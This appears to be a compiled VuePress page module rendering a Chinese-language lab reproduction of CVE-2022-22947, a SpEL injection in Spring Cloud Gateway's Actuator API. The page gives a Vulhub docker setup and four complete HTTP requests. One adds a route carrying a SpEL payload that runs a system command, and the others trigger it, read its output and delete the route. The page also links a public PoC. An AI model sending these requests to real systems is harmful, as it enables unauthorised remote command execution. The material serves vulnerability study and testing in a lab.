import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as r,c as d,a as e,b as n,d as a,e as t}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,"Spring Cloud Gateway 是 Spring 中的一个 API 网关。其 3.1.0 及 3.0.6 版本（包含）以前存在一处 SpEL 表达式注入漏洞，当攻击者可以访问 Actuator API 的情况下，将可以利用该漏洞执行任意命令。",-1),p=e("p",null,"参考链接：",-1),v={href:"https://tanzu.vmware.com/security/cve-2022-22947",target:"_blank",rel:"noopener noreferrer"},m={href:"https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/",target:"_blank",rel:"noopener noreferrer"},g=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个使用了 Spring Cloud Gateway 3.1.0 的 Web 服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,3),b=e("code",null,"http://your-ip:8080",-1),h={href:"http://example.com",target:"_blank",rel:"noopener noreferrer"},_=t(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203032058450.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用这个漏洞需要分多步。</p><p>首先，发送如下数据包即可添加一个包含恶意 SpEL 表达式的路由：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 328

{
  &quot;id&quot;: &quot;hacktest&quot;,
  &quot;filters&quot;: [{
    &quot;name&quot;: &quot;AddResponseHeader&quot;,
    &quot;args&quot;: {&quot;name&quot;: &quot;Result&quot;,&quot;value&quot;: &quot;#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot;}
  }],
&quot;uri&quot;: &quot;http://example.com&quot;,
&quot;order&quot;: 0
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203032101702.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后，发送如下数据包应用刚添加的路由。这个数据包将触发 SpEL 表达式的执行：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /actuator/gateway/refresh HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203032103775.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送如下数据包即可查看执行结果：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203032104469.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>最后，发送如下数据包清理现场，删除所添加的路由：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>DELETE /actuator/gateway/routes/hacktest HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203032105191.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="开源-poc" tabindex="-1"><a class="header-anchor" href="#开源-poc" aria-hidden="true">#</a> 开源 POC</h2>`,16),f=e("li",null,"Xray",-1),x={href:"https://github.com/chaosec2021/CVE-2022-22947-POC",target:"_blank",rel:"noopener noreferrer"};function k(w,y){const i=s("ExternalLinkIcon");return r(),d("div",null,[c,u,p,e("ul",null,[e("li",null,[e("a",v,[n("https://tanzu.vmware.com/security/cve-2022-22947"),a(i)])]),e("li",null,[e("a",m,[n("https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/"),a(i)])])]),g,e("p",null,[n("服务启动后，访问 "),b,n(" 即可看到演示页面，这个页面的上游就是 "),e("a",h,[n("example.com"),a(i)]),n("。")]),_,e("ul",null,[f,e("li",null,[e("a",x,[n("https://github.com/chaosec2021/CVE-2022-22947-POC"),a(i)])])])])}const T=l(o,[["render",k],["__file","Spring Cloud Gateway Actuator API SpEL表达式注入命令执行 CVE-2022-22947.html.vue"]]);export{T as default};
